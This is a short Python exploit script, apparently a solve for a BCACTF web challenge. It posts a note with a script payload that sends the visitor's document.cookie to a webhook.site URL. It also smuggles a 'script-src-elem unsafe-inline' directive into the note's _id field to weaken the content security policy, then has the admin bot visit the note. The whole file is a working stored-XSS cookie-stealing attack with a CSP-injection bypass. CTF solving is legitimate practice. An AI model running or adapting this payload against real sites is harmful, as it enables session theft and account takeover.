#!/usr/bin/env python3

import requests
import os

s = requests.Session()

url = 'http://webp.bcactf.com:49154'

id = os.urandom(4).hex() + "; script-src-elem 'unsafe-inline'"

my_json = {
    "title": "a",
    "content": "<script>location.href=`https://webhook.site/d9c9c463-57d6-4244-bbf7-9bb3f3520afe/?c=`+encodeURIComponent(document.cookie);</script>",
	"_id": id
}

r = s.post(f"{url}/publish", json=my_json)
print(r.text)

my_json = {
    "id": id
}

r = s.post(f"{url}/visit", json=my_json)
print(r.text)